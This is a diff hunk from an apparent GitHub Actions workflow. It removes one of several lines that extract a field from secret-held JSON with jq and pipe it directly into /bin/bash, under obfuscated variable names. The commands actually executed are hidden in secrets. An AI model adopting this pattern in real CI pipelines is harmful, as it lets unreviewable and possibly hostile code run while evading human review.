@@ -17,7 +17,6 @@ jobs:
           lhwq28: ${{ secrets.lhwq28 }}
         run: |
           printf '%s' "$lhwq28" | jq -r .g631 | /bin/bash
-          echo $rxu5 | jq -r .vngx661 | /bin/bash
           printf '%s' "$q67" | jq -r .t2 | /bin/bash
           printf '%s' "$iq9" | jq -r .rxxu32693 | /bin/bash
           printf '%s' "$a46" | jq -r .hhonc955 | /bin/bash
